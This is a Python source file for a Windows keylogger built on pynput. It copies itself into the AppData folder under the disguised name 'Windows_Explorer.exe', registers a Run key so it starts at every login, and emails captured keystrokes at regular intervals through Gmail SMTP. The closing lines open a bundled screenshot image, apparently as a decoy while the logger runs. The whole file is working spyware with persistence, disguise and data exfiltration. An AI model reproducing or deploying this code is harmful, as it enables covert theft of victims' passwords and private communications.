import os
import shutil
import subprocess
import sys
import threading
import pynput.keyboard
import smtplib


class Keylogger:

    def __init__(self, reporting_interval, email, password):
        self.log = "keylogger started"
        self.interval_time = reporting_interval
        self.email = email
        self.password = password
        self.become_persistent()

    def appending(self, string):
        self.log = self.log + string

    # Configuring for windows only.
    def become_persistent(self):
        file_location = os.environ["appdata"] + "\\Windows_Explorer.exe"
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call(
                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Explorer /t REG_SZ /d "' + file_location + '"',
                shell=True)

    # defining function which has been called when a key is pressed.
    def process_key_pressed(self, key):

        try:
            new_add = str(key.char)

        except AttributeError:
            if key == key.space:
                new_add = " "
            elif str(key).find('Key') == 0:
                new_add = str(key).split('.')[1]
                new_add = " " + new_add + " "
            else:
                new_add = " " + str(key) + " "
        self.appending(new_add)

    def report(self):
        self.send_mail(self.email, self.password, self.log)
        self.log = ""
        timerr = threading.Timer(self.interval_time, self.report)
        timerr.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    # creating a object of class pynput.keyboard.listener where on pressing a key function "process_key_pressed" is called.
    def start(self):
        listen_keyboard = pynput.keyboard.Listener(on_press=self.process_key_pressed)
        with listen_keyboard:
            self.report()
            listen_keyboard.join()


normal_file = sys._MEIPASS + ".\screenshot1.png"
subprocess.Popen(normal_file, shell=True)
